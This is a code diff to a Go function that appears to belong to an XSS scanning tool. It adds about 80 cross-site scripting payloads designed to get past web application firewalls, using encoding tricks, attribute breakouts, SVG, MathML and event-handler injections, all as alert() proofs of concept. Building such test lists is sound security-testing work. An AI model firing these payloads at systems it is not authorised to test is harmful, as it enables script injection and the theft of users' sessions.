@@ -492,6 +492,142 @@ func GetWafBypassPayloads() []Payload {
 		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "polyglot", WAF: "generic"})
 	}
 
+	// === Advanced Bypass (from xsscx/fuzz) ===
+	advanced := []string{
+		// Modern JS features - Async constructors
+		`(async function(){}).constructor('alert(1)')()`,
+		`(async function*(){}).constructor('alert(2)')().next()`,
+
+		// Modern JS features - Optional chaining
+		`alert?.(document?.cookie)`,
+		`globalThis?.alert?.(1)`,
+		`self?.alert?.(1)`,
+		`top?.alert?.(1)`,
+
+		// Modern JS features - Template literals
+		"<script>alert`1`</script>",
+		"<img src=x onerror=alert`1`>",
+		"<svg onload=alert`1`>",
+
+		// HTML entity encoding (padded)
+		`&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;`,
+		`&#60;script&#62;alert(1)&#60;/script&#62;`,
+		`&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;`,
+
+		// Unicode/fullwidth characters
+		`＜script＞alert(1)＜/script＞`,
+		`＜img src=x onerror=alert(1)＞`,
+
+		// Tab/newline in tags
+		"<img src=x\tonerror=alert(1)>",
+		"<img src=x\nonerror=alert(1)>",
+		"<img src=x\ronerror=alert(1)>",
+		"<svg\nonload=alert(1)>",
+		"<svg\tonload=alert(1)>",
+
+		// Malformed HTML comments
+		`<!--><script>alert(1)</script>`,
+		`<!-- --!><script>alert(1)</script>`,
+		`<![CDATA[<script>alert(1)</script>]]>`,
+
+		// Attribute breakout variants
+		`"><img src=x onerror=alert(1)>`,
+		`'><img src=x onerror=alert(1)>`,
+		`"><svg onload=alert(1)>`,
+		`'><svg onload=alert(1)>`,
+		`"><details open ontoggle=alert(1)>`,
+		`"><iframe src=javascript:alert(1)>`,
+
+		// Self-closing tag breakout
+		`"/><img src=x onerror=alert(1)>`,
+		`'/><img src=x onerror=alert(1)>`,
+		`"/><svg onload=alert(1)>`,
+
+		// Protocol handlers with encoding
+		`javascript&colon;alert(1)`,
+		`javascript&#58;alert(1)`,
+		`data:text/html,<script>alert(1)</script>`,
+		`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`,
+
+		// SVG animate/set
+		`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+		`<svg><set onbegin=alert(1) attributename=x to=1>`,
+		`<svg><animate attributeName=href values=javascript:alert(1)>`,
+
+		// Noscript bypass
+		`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
+		`<noscript><p title="</noscript><svg onload=alert(1)>">`,
+
+		// MathML injection
+		`<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>`,
+		`<math><mtext><table><mglyph><svg onload=alert(1)>`,
+
+		// Boolean operator injection
+		`";alert(1)//`,
+		`'||alert(1)//`,
+		`"-alert(1)-"`,
+		`'-alert(1)-'`,
+
+		// Array method injection
+		`<img src=x onerror=[1].find(alert)>`,
+		`<img src=x onerror=[1].map(alert)>`,
+		`<img src=x onerror=[1].some(alert)>`,
+		`<img src=x onerror=[1].filter(alert)>`,
+		`<img src=x onerror=[1].forEach(alert)>`,
+
+		// Web Worker + importScripts
+		`<script>importScripts('data:text/javascript,alert(1)')</script>`,
+		`<script>new Worker('data:text/javascript,alert(1)')</script>`,
+
+		// Import dynamic
+		`<script>import('data:text/javascript,alert(1)')</script>`,
+
+		// Proxy/Reflect
+		`<img src=x onerror=new Proxy({},{get:alert}).x>`,
+		`<img src=x onerror=Reflect.apply(alert,window,[1])>`,
+
+		// Symbol/iterator
+		`<img src=x onerror=alert[Symbol.toPrimitive](1)>`,
+
+		// Destructuring
+		`<img src=x onerror={({x:alert}).x(1)}>`,
+		`<img src=x onerror=((x=alert)=>x(1))()>`,
+
+		// HTMX event handlers
+		`<img src=x hx-on:htmx:load='alert(1)'>`,
+		`<div hx-on:click='alert(1)'>click</div>`,
+		`<button hx-on:mouseover='alert(1)'>hover</button>`,
+
+		// Custom element events
+		`<custom-element oncustom=alert(1)>`,
+		`<div onanimationend=alert(1) style=animation:x>`,
+		`<div ontransitionend=alert(1) style=transition:all 1s>`,
+
+		// Clipboard events
+		`<input onpaste=alert(1)>`,
+		`<input oncopy=alert(1)>`,
+		`<input oncut=alert(1)>`,
+
+		// Drag events
+		`<div draggable ondragstart=alert(1)>drag</div>`,
+		`<div ondrop=alert(1)>drop</div>`,
+
+		// Form events
+		`<form onsubmit=alert(1)><input type=submit></form>`,
+		`<input oninvalid=alert(1) required><input type=submit>`,
+		`<select onchange=alert(1)><option>1</option><option>2</option></select>`,
+
+		// Media events
+		`<video oncanplay=alert(1)><source src=x>`,
+		`<audio onplay=alert(1)><source src=x>`,
+		`<video onseeked=alert(1)><source src=x>`,
+		`<video onratechange=alert(1)><source src=x>`,
+	}
+
+	for _, p := range advanced {
+		payloads = append(payloads, Payload{Value: p, Context: ContextHTML, Tag: "advanced-bypass", WAF: "generic"})
+	}
+
 	return payloads
 }
 
